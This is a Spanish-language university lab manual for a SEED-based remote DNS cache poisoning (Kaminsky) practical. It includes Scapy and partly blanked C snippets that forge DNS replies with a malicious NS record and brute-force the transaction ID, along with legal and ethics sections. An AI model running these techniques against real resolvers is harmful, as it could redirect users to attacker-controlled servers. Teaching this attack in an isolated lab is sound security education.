<div align="center">

# P-12 · Ataques al DNS Remoto (Kaminsky)

![Docker](https://img.shields.io/badge/Docker-Lab_Environment-2496ED?style=for-the-badge&logo=docker&logoColor=white)
![Python](https://img.shields.io/badge/Python-Scripts-yellow?style=for-the-badge&logo=python)
![Security](https://img.shields.io/badge/Focus-Network_Security-critical?style=for-the-badge)

</div>

> Práctica del **Manual de Prácticas** de Seguridad en Redes · INGE-00107 · Universidad de Cuenca.  
> Documento generado desde el manual: no lo edite a mano (véase el [índice de prácticas](../practicas/README.md)).

> [!NOTE]
> El entorno de esta práctica todavía no está publicado en esta carpeta.

| Campo | Valor |
| --- | --- |
| **Asignatura** | Seguridad en Redes |
| **Docente** | Dr. Fabián Astudillo-Salinas |
| **Unidad** | 800 – Sistema DNS y ataques |
| **Código** | INGE-00107 |
| **Modalidad** | Presencial |
| **Valoración** | 10 puntos |
| **Grupos** | Máx. 3 estudiantes |
| **Entrega** | Según calendario |
| **ABET** | SO4 – Responsabilidad Ética y Profesional (PI 4.1 y PI 4.2) — representa el 30 % de la valoración |

## Marco Teórico

Los fundamentos teóricos sintetizados en esta sección se basan en [1], [2]; se recomienda consultar dichas fuentes para una exposición más profunda. El procedimiento de laboratorio adapta el *Remote DNS Cache Poisoning Attack Lab* (ataque de Kaminsky) de SEED [2].

### Del ataque local al ataque remoto

En la práctica P-11 el atacante estaba en la misma LAN que el servidor DNS y podía **husmear** las consultas, lo que facilitaba falsificar la respuesta. En el ataque **remoto**, el atacante *no* puede husmear los paquetes, por lo que el envenenamiento de caché es mucho más difícil: la respuesta falsa debe coincidir con el **Transaction ID** (`id`) de la consulta, que el servidor genera de forma aleatoria.

### El obstáculo del Transaction ID y el efecto caché

El `id` es de **16 bits**. Sin ver la consulta, el atacante debe *adivinarlo*: si envía K respuestas falsas dentro de la ventana de ataque (antes de que llegue la respuesta legítima), la probabilidad de éxito es K/2^16. Enviar cientos de respuestas no es impráctico, pero existe el **efecto caché**: si el atacante no acierta antes de que llegue la respuesta real, la información correcta queda en la caché y el servidor no volverá a consultar ese nombre hasta que expire el TTL (horas o días), bloqueando nuevos intentos sobre el mismo nombre.

### El ataque de Kaminsky

Dan Kaminsky ideó una técnica que **derrota el efecto caché**: en lugar de atacar un nombre fijo, el atacante consulta repetidamente **nombres aleatorios e inexistentes** del dominio objetivo (p. ej. `twysw.example.com`). Como no están en caché, el servidor víctima (`Apollo`) envía una nueva consulta cada vez, dando al atacante intentos ilimitados. La clave está en la respuesta falsa: además de una respuesta para el nombre aleatorio, incluye en la sección **Authority** un registro NS que designa a `ns.attacker32.com` como servidor de nombres de *todo* el dominio `example.com`. Si una respuesta falsa gana la carrera y acierta el `id`, la caché de `Apollo` queda envenenada y desde entonces preguntará al servidor del atacante por cualquier host de `example.com`.

> [!NOTE]
> Atacar servidores DNS reales es ilegal; el ataque se realiza en un entorno aislado contra un servidor propio. La contramedida (DNSSEC, con puerto origen aleatorizado) se estudia en la práctica P-15.

**Objetivo general**
Comprender y ejecutar de forma controlada el ataque de envenenamiento de caché DNS **remoto** (Kaminsky), superando el obstáculo del Transaction ID y el efecto caché mediante consultas a nombres aleatorios.
**Objetivos específicos**

- **OE1.** Levantar la topología de contenedores y verificar la configuración del DNS local y del servidor del atacante.
- **OE2.** Construir y enviar consultas DNS con Scapy para disparar las consultas del servidor víctima.
- **OE3.** Construir respuestas DNS falsas con registro NS en la sección *Authority*.
- **OE4.** Lanzar el ataque de Kaminsky con el enfoque híbrido Scapy + C y verificar el envenenamiento de la caché.
- **OE5.** Analizar la probabilidad de éxito y las contramedidas.

## Actividades previas

Antes de la sesión de laboratorio, cada estudiante debe completar las siguientes actividades preparatorias:

- **AP1.** Completar la práctica P-11 (ataque al DNS local) y repasar el marco teórico y las referencias citadas.
- **AP2.** Verificar que el entorno virtual (VM SEED y contenedores Docker) esté operativo conforme al capítulo *Configuración del Entorno*.
- **AP3.** Tomar una *snapshot* del estado inicial de cada VM involucrada en la práctica para poder revertir cambios.
- **AP4.** Revisar la Sección [Seguridad y normas generales del laboratorio](../practicas/00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio) (Seguridad y normas generales del laboratorio).
- **AP5.** Preparar la bitácora digital para registrar comandos, capturas y observaciones durante la sesión.

## Materiales y Equipos

| Recurso | Descripción |
| --- | --- |
| SEED Ubuntu 20.04 VM | Entorno de laboratorio SEED |
| SEED `Labsetup.zip` | Topología y `docker-compose.yml` del Remote DNS Lab |
| Docker + Docker Compose | Contenedores: usuario, DNS local, atacante y NS del atacante |
| Python 3 + Scapy | Construcción de consultas/respuestas DNS |
| GCC / C | Programa `attack.c` para el flujo de alta velocidad |
| BIND 9 (`rndc`, `dig`) | Servidor DNS local y consultas |

> [!NOTE]
> **Provisión de materiales**
>
> El estudiante adquiere o instala por su cuenta el equipo personal (laptop), las máquinas virtuales (VirtualBox, SEED VM, Kali Linux, contenedores Docker) y todo el software listado arriba. El laboratorio de la Carrera de Telecomunicaciones provee el espacio físico, el mobiliario y **acceso a Internet supervisado** para la descarga de imágenes, paquetes y consulta de documentación durante la sesión. El laboratorio no entrega equipos de cómputo personales ni licencias de software.

## Entorno de Laboratorio

> **Figura 1.** Topología del laboratorio P-12 (*Environment setup*): igual que en el ataque local, pero el atacante se trata como **remoto** (no puede husmear el tráfico de la LAN).  
> *(diagrama vectorial; se reproduce en el PDF del manual)*

A diferencia del ataque local (P-11), aunque las máquinas estén en la misma LAN **está prohibido** aprovechar esa cercanía: el atacante debe tratarse como una máquina remota que no puede husmear paquetes. La configuración del DNS local es la misma que en P-11 (puerto origen fijo `33333`, DNSSEC desactivado, zona `attacker32.com` reenviada a `10.9.0.153`, y el usuario usando `10.9.0.53` como resolvedor).

## Consideraciones de seguridad

Antes de iniciar el procedimiento, revise la Sección [Seguridad y normas generales del laboratorio](../practicas/00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio) (Seguridad y normas generales del laboratorio). Para esta práctica se destacan los siguientes riesgos y precauciones específicas:

- **Aislamiento de red obligatorio**: el ataque debe ejecutarse exclusivamente contra el servidor DNS propio del laboratorio. Está prohibido dirigirlo contra servidores DNS reales, la red institucional o equipos de terceros.
- **Snapshots y reversibilidad**: tome una instantánea antes de modificar configuraciones de BIND, la caché DNS o `/etc/hosts`.
- **Marco legal**: el envenenamiento de caché DNS contra sistemas ajenos puede tipificarse como delito informático (COIP Arts. 229 y 234; Ley Orgánica de Protección de Datos Personales). Véase el warningbox de la Sección [Seguridad y normas generales del laboratorio](../practicas/00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio).
- **Riesgos eléctricos y ergonomía**: aplique las pausas activas y las verificaciones de las Secciones *Riesgos eléctricos* y *Ergonomía* dentro de Sección [Seguridad y normas generales del laboratorio](../practicas/00-normas-generales.md#seguridad-y-normas-generales-del-laboratorio).

> [!WARNING]
> **Riesgos específicos de la práctica**
>
> El ataque genera un alto volumen de paquetes falsos. Asegúrese de acotarlo al contenedor del servidor DNS local; un flujo descontrolado puede saturar la red NAT del laboratorio. Documente en la bitácora las medidas de contención adoptadas.

## Procedimiento

### Configuración del entorno y pruebas

Levante la topología con `docker-compose` (alias `dcbuild`, `dcup`, `dockps`, `docksh`). Verifique la configuración desde el contenedor del usuario, igual que en la P-11:

**Listado 1.** Verificar la configuración DNS

```bash
$ dig ns.attacker32.com                      # reenviada al NS atacante
$ dig www.example.com                         # vía el DNS local
$ dig @ns.attacker32.com www.example.com      # directo al NS atacante
```

### El proceso completo de resolución DNS

Cuando `Apollo` (el DNS local víctima) recibe una consulta por un nombre que no está en su caché, realiza la resolución recursiva: pregunta a la raíz, luego al servidor `.COM` y finalmente al servidor de `example.com` (Figura 2). Mientras `Apollo` espera la respuesta legítima, el atacante intenta colar una respuesta falsa.

> **Figura 2.** Proceso completo de resolución DNS recursiva en el servidor víctima (adaptado de la Fig. 2 del SEED Remote DNS Lab).  
> *(diagrama vectorial; se reproduce en el PDF del manual)*

### Tarea 1 — Cómo funciona el ataque de Kaminsky

El atacante consulta a `Apollo` por un nombre aleatorio inexistente (`twysw.example.com`); como no está en caché, `Apollo` consulta al servidor de `example.com`. Mientras tanto, el atacante inunda a `Apollo` con respuestas falsas que, en la sección *Authority*, declaran a `ns.attacker32.com` como NS del dominio (Figura 3). Si una respuesta falsa gana la carrera y acierta el `id`, la caché queda envenenada; si falla, basta usar otro nombre aleatorio y reintentar (se anula el efecto caché).

> **Figura 3.** Ataque de Kaminsky: inundación de respuestas falsas con un registro NS malicioso en la sección *Authority* (adaptado de la Fig. 3 del SEED Remote DNS Lab).  
> *(diagrama vectorial; se reproduce en el PDF del manual)*

### Tarea 2 — Construir la consulta DNS

El atacante debe disparar consultas en `Apollo` para tener oportunidades de falsificar. Automatice el envío de consultas por un nombre aleatorio del dominio `example.com`; demuestre con Wireshark que disparan las consultas correspondientes del servidor víctima (`+++` son marcadores a completar):

**Listado 2.** Construir una consulta DNS (Scapy)

```python
Qdsec = DNSQR(qname='www.example.com')
dns   = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,
            arcount=0, qd=Qdsec)
ip  = IP(dst='+++', src='+++')
udp = UDP(dport=+++, sport=+++, chksum=0)
request = ip/udp/dns
```

### Tarea 3 — Falsificar la respuesta DNS

Construya la respuesta falsa imitando al servidor de `example.com`. Debe incluir la sección de pregunta, la de respuesta (Answer) y la de autoridad (NS). Justifique los valores elegidos (en especial el `id`, los puertos y el NS de la sección Authority):

**Listado 3.** Construir una respuesta DNS falsa (Scapy)

```python
name   = '+++'
domain = '+++'
ns     = '+++'
Qdsec  = DNSQR(qname=name)
Anssec = DNSRR(rrname=name,   type='A',  rdata='1.2.3.4', ttl=259200)
NSsec  = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns    = DNS(id=0xAAAA, aa=1, rd=1, qr=1,
             qdcount=1, ancount=1, nscount=1, arcount=0,
             qd=Qdsec, an=Anssec, ns=NSsec)
ip  = IP(dst='+++', src='+++')
udp = UDP(dport=+++, sport=+++, chksum=0)
reply = ip/udp/dns
```

### Tarea 4 — Lanzar el ataque de Kaminsky

Para tener éxito hay que enviar *muchas* respuestas falsas muy rápido; Scapy es demasiado lento, así que se usa un enfoque **híbrido**: Scapy genera una plantilla de paquete y un programa en C la carga, modifica unos pocos campos y la reenvía a gran velocidad. El esqueleto está en `Labsetup/Files/attack.c`.

**Listado 4.** Generar la plantilla del paquete (generate_dns_reply.py)

```python
name   = 'twysw.example.com'
Qdsec  = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.1.2.2', ttl=259200)
dns    = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
             qdcount=1, ancount=1, nscount=0, arcount=0,
             qd=Qdsec, an=Anssec)
ip  = IP(dst='10.0.2.7', src='1.2.3.4', chksum=0)
udp = UDP(dport=33333, sport=53, chksum=0)
pkt = ip/udp/dns
with open('ip.bin', 'wb') as f:
    f.write(bytes(pkt))
```

En C se carga `ip.bin` como plantilla y, por cada réplica, se cambian tres campos: el **Transaction ID** (offset `28`) y el **nombre aleatorio** en la pregunta (offset `41`) y en la respuesta (offset `64`). Los offsets del nombre se localizan con un editor binario (p. ej. `bless`).

**Listado 5.** Modificar los campos en cada réplica (attack.c)

```c
// Nombre en la sección de pregunta (offset 41)
memcpy(ip+41, "bbbbb", 5);
// Nombre en la sección de respuesta (offset 64)
memcpy(ip+64, "bbbbb", 5);
// Transaction ID (offset 28)
unsigned short id = 1000;
unsigned short id_net_order = htons(id);
memcpy(ip+28, &id_net_order, 2);
```

**Listado 6.** Generar nombres aleatorios de 5 caracteres

```c
char a[26] = "abcdefghijklmnopqrstuvwxyz";
char name[6];  name[5] = 0;
for (int k = 0; k < 5; k++)
    name[k] = a[rand()
```

**Listado 7.** Compilar y verificar la caché

```bash
$ gcc -o attack attack.c          # (Apple Silicon: gcc -static -o attack attack.c)
# Comprobar si la caché quedó envenenada:
# rndc dumpdb -cache && grep attacker /var/cache/bind/dump.db
```

### Tarea 5 — Verificación del resultado

Si el ataque tiene éxito, en la caché de `Apollo` el registro NS de `example.com` será `ns.attacker32.com`. Desde el usuario, compare ambas consultas: la IP de `www.example.com` debe coincidir y ser la del archivo de zona del atacante.

**Listado 8.** Verificar el envenenamiento desde el usuario

```bash
$ dig www.example.com                       # vía el DNS local (envenenado)
$ dig @ns.attacker32.com www.example.com    # directo al NS atacante
```

## Recolección y análisis de datos

Durante la ejecución del procedimiento, registre en su bitácora los datos solicitados a continuación. Las tablas siguientes (o equivalentes en su informe) forman parte del entregable, conforme a la Sección [Directrices generales para el informe técnico](../practicas/00-normas-generales.md#directrices-generales-para-el-informe-técnico) (Directrices generales para el informe técnico).

**Tabla 1.** Bitácora de comandos y observaciones

| # | Comando / Acción | Salida u observación relevante |
| --- | --- | --- |
| 1 |   |   |
| 2 |   |   |
| 3 |   |   |
| 4 |   |   |
| 5 |   |   |

**Tabla 2.** Resultados clave / métricas obtenidas

| Métrica o evidencia | Valor | Comentario / unidad |
| --- | --- | --- |
| Paquetes falsos por segundo |   |   |
| Tiempo hasta envenenar la caché |   |   |
| NS en caché tras el ataque |   |   |

**Pautas para el análisis de los datos recolectados:**

- Contraste los resultados observados con el comportamiento esperado según el marco teórico; explique las diferencias.
- Estime la probabilidad de éxito por intento (K/2^16) y relaciónela con el número de intentos observado.
- Calcule métricas cuantitativas (paquetes por segundo, número de intentos, tiempo hasta el envenenamiento) y preséntelas en gráficos o tablas adicionales en el informe.

## Preguntas de Análisis

- **P1.** ¿Por qué el ataque remoto es más difícil que el local? ¿Qué información pierde el atacante al no poder husmear la LAN?
- **P2.** Explique el papel del *Transaction ID* y por qué su tamaño de 16 bits hace viable el ataque por fuerza bruta dentro de la ventana.
- **P3.** ¿Qué es el *efecto caché* y cómo lo derrota el ataque de Kaminsky usando nombres aleatorios?
- **P4.** ¿Por qué la respuesta falsa coloca el registro malicioso en la sección *Authority* (NS) en lugar de solo en la *Answer*? ¿Qué ventaja le da al atacante?
- **P5.** ¿Por qué se usa un enfoque híbrido Scapy + C en lugar de solo Scapy? ¿Qué campos se modifican en cada réplica y en qué offsets?
- **P6.** ¿Cómo previenen este ataque la aleatorización del puerto origen y DNSSEC? (DNSSEC se configura en la práctica P-15).

## Actividad ABET — SO4: Responsabilidad Ética y Profesional

Esta actividad mide el **Student Outcome 4 (SO4)** de la Carrera de Telecomunicaciones requerido para la acreditación ABET: *habilidad para reconocer las responsabilidades éticas y profesionales en situaciones de ingeniería y emitir juicios fundamentados, considerando el impacto global, económico, medioambiental y social de las soluciones propuestas.* Representa el **30 %** de la valoración total de la práctica y evalúa los indicadores PI 4.1 y PI 4.2 mediante las preguntas SO4-1 y SO4-2.

- **SO4-1.** **[PI 4.1 — 15 %] Ética y responsabilidad profesional ante la divulgación de un exploit DNS**
  Un investigador ecuatoriano de seguridad redescubre de forma independiente el ataque Kaminsky en una implementación moderna de DNS y desarrolla un exploit funcional. Decide publicar el exploit completo en un foro técnico antes de notificar a los fabricantes de DNS (BIND, Unbound) para ``darse crédito por el descubrimiento''. Evalúe éticamente:

  - **a)** La decisión de full disclosure inmediata frente a la responsible disclosure (con período de embargo de 90 días) desde la perspectiva del impacto en el ecosistema.
  - **b)** Los principios de beneficencia y no maleficencia: quiénes se benefician y quiénes resultan dañados en cada enfoque de divulgación.
  - **c)** El marco legal ecuatoriano (COIP Arts. 229 y 234) y las implicaciones para el investigador según el enfoque de divulgación elegido.
- **SO4-2.** **[PI 4.2 — 15 %] Impacto integral del ataque Kaminsky contra un ISP ecuatoriano**
  Un atacante ejecuta el ataque Kaminsky contra el servidor DNS recursivo de uno de los principales ISPs ecuatorianos, envenenando la caché y afectando a 500 000 usuarios activos durante 3 horas que son redirigidos a sitios de phishing. Analice:

  - **a)** **Económico:** fraudes directos a usuarios redirigidos, multas al ISP, costos de respuesta al incidente y pérdida de suscriptores.
  - **b)** **Social:** robo de credenciales bancarias y de redes sociales a gran escala, erosión de la confianza en el sistema DNS y en los ISPs ecuatorianos.
  - **c)** **Ambiental:** consumo energético de la respuesta al incidente y de la actualización masiva de resolvedores DNS.
  - **d)** **Contramedidas:** dos técnicas (DNSSEC, randomización de puertos fuente) y una política organizacional, citando RFC 5452, RFC 4033 o NIST SP 800-81r2.

## Discusión y conclusiones

A partir de los datos recolectados y del análisis realizado, elabore una discusión que responda al menos a las siguientes preguntas guía:

- **DC1.** ¿Se alcanzaron los objetivos planteados? Justifique cada uno con evidencia experimental concreta (capturas, métricas, salidas de comandos).
- **DC2.** ¿Qué limitaciones impone el entorno virtualizado a los resultados? ¿Cómo se trasladarían las observaciones a un escenario real de producción?
- **DC3.** ¿Qué contramedidas o controles de seguridad mitigan el ataque o refuerzan la defensa estudiada? Cite al menos una buena práctica de la industria, una RFC o un estándar (ISO/IEC, IEEE, NIST) pertinente.
- **DC4.** ¿Qué errores se cometieron durante la práctica y qué recomendaciones daría a futuros estudiantes para evitarlos?

Cierre con **conclusiones** (3–5 viñetas) que resuman los hallazgos principales y los vinculen explícitamente con los *Resultados de Aprendizaje* de la asignatura.

## Entregables

1. **Informe técnico** detallado con capturas que describan lo realizado y observado en cada tarea (1–5): código Scapy/C comentado, capturas Wireshark de las consultas disparadas y de las respuestas falsas, y el volcado de la caché (`rndc dumpdb`) que demuestre el envenenamiento. Explique cada fragmento de código (adjuntar sin explicar no recibe puntaje). Bibliografía IEEE (≥3 fuentes).
2. **Código fuente** de la generación de la plantilla (`generate_dns_reply.py`) y del programa de ataque (`attack.c`).
3. **Respuestas a la Actividad ABET – SO4** (preguntas SO4-1 y SO4-2), integradas en el informe técnico con extensión de 1–2 páginas por pregunta y las fuentes citadas según norma IEEE.

## Rúbrica de Evaluación

**Tabla 3.** Rúbrica — P-12 (10 puntos)

| Criterio | Peso | Indicador | Descripción |
| --- | --- | --- | --- |
| Entorno y pruebas | 7 % | Topología verificada | Contenedores operativos; `dig` confirma la configuración. |
| Consulta DNS | 14 % | Consultas disparadas | Tarea 2: las consultas del atacante disparan las del DNS víctima (visible en Wireshark). |
| Respuesta falsa | 18 % | Réplica válida | Tarea 3: respuesta falsa con NS en *Authority*, válida en Wireshark. |
| Ataque Kaminsky | 21 % | Caché envenenada | Tarea 4–5: `ns.attacker32.com` queda como NS de `example.com` en la caché; verificado con `dig`. |
| Análisis | 10 % | Preguntas respondidas | Respuestas con fundamento técnico (probabilidad, contramedidas). |
| **ABET – SO4: Responsabilidad Ética y Profesional (30 %)** |   |   |   |
| PI 4.1 – Ética profesional | 15 % | Respuesta ética fundamentada | Aplica principios éticos y legales al escenario del incidente; la cadena de notificación está justificada. |
| PI 4.2 – Impacto integral | 15 % | Análisis de impacto | Evalúa impacto económico, social y ambiental con contramedidas técnicas y organizacionales, citando al menos un estándar internacional. |

**Tabla 4.** Escala ABET SO4 — P-12

| PI | No cumple<br>(0–59 %) | Cumple parcialmente<br>(60–69 %) | Cumple<br>(70–79 %) | Supera<br>(80–89 %) | Supera ampliamente<br>(90–100 %) |
| --- | --- | --- | --- | --- | --- |
| 4.1 | No aplica principios éticos ni profesionales al evaluar la situación de incidente. | Aplica de manera inconsistente los principios éticos; el análisis legal es superficial o erróneo. | Aplica de manera básica los principios éticos; menciona el marco legal ecuatoriano sin análisis profundo. | Aplica coherentemente su juicio ético y profesional; integra el COIP y la LOPDP con argumentación clara. | Aplica de manera ejemplar e integral su juicio ético; argumenta cada decisión con evidencia y normativas citadas con precisión. |
| 4.2 | No considera ninguno de los tres impactos (económico, social, ambiental). | Considera parcialmente uno o dos de los impactos; las contramedidas no citan estándares. | Considera los tres impactos de forma adecuada; propone contramedidas pertinentes con al menos un estándar citado. | Integra los tres impactos con análisis detallado y contramedidas bien fundamentadas en estándares internacionales. | Realiza una evaluación exhaustiva de los tres impactos; las contramedidas son innovadoras y se respaldan en múltiples estándares. |

## Referencias

1. Arends, Roy and others, «DNS Security Introduction and Requirements». RFC 4033, 2005.
2. Du, Wenliang, «Computer & Internet Security: A Hands-on Approach». Independently published, 2019.
